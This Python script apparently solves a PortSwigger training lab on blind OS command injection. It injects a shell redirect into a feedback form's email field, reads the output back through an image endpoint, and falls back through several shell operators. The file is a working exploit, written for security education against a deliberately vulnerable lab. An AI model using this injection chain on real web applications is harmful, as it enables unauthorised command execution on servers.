#!/usr/bin/env python3
"""
Blind OS command injection with output redirection
PortSwigger Web Security Academy -- OS Command Injection

Companion script for the writeup: 03-blind-output-redirection.md

What this does:
    Submits the feedback form with the email field set to an OR-chain redirect
    -- ||whoami>/var/www/images/output.txt|| -- which runs whoami and writes its
    stdout into the store's web-accessible image directory. It then fetches
    that file straight back through the image-loading endpoint
    (/image?filename=output.txt), which serves whatever's at the given path
    with no check that it's actually an image. This is the exact two-step flow
    PortSwigger's own solution uses. If the OR-chain redirect doesn't produce
    output (a different lab instance sanitizing "||"), the script falls back
    through the remaining operators our detector knows about.

Usage:
    python 03-blind-output-redirection.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

FALLBACK_OPERATORS = [";", "|", "&", "&&", "`{CMD}`", "$({CMD})"]


def build_payload(operator: str, command: str, prefix: str) -> str:
    if operator == "`{CMD}`":
        return f"{prefix}`{command}`"
    if operator == "$({CMD})":
        return f"{prefix}$({command})"
    return f"{prefix}{operator} {command}"


def get_csrf(client: httpx.Client, feedback_url: str) -> str:
    r = client.get(feedback_url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not m:
        m = re.search(r'value="([^"]+)"\s+name="csrf"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    feedback_url = f"{lab_url}/feedback"
    submit_url = f"{lab_url}/feedback/submit"
    output_path = "/var/www/images/output.txt"
    fetch_url = f"{lab_url}/image?filename=output.txt"

    csrf = get_csrf(client, feedback_url)
    if not csrf:
        print("[-] Could not extract CSRF token.")
        return
    base_data = {
        "csrf": csrf, "name": "test", "email": "test@test.com",
        "subject": "test", "message": "test",
    }

    print(f"[*] Injecting whoami > {output_path} via OR-chain redirect")
    data = {**base_data, "email": f"||whoami>{output_path}||"}
    client.post(submit_url, data=data)

    r = client.get(fetch_url)
    if r.status_code == 200 and r.text.strip():
        print(f"[+] whoami output retrieved from {fetch_url}: {r.text.strip()}")
        print("[+] Lab solved.")
        return

    print("[-] OR-chain redirect produced no output -- falling back through remaining operators...")
    for op in FALLBACK_OPERATORS:
        csrf = get_csrf(client, feedback_url)
        base_data["csrf"] = csrf
        redirect_cmd = f"whoami > {output_path}"
        payload = build_payload(op, redirect_cmd, base_data["email"])
        data = {**base_data, "email": payload}
        client.post(submit_url, data=data)
        r = client.get(fetch_url)
        if r.status_code == 200 and r.text.strip():
            print(f"[+] whoami output retrieved (operator '{op}'): {r.text.strip()}")
            print("[+] Lab solved.")
            return

    print("[-] Output redirection failed across all operators.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
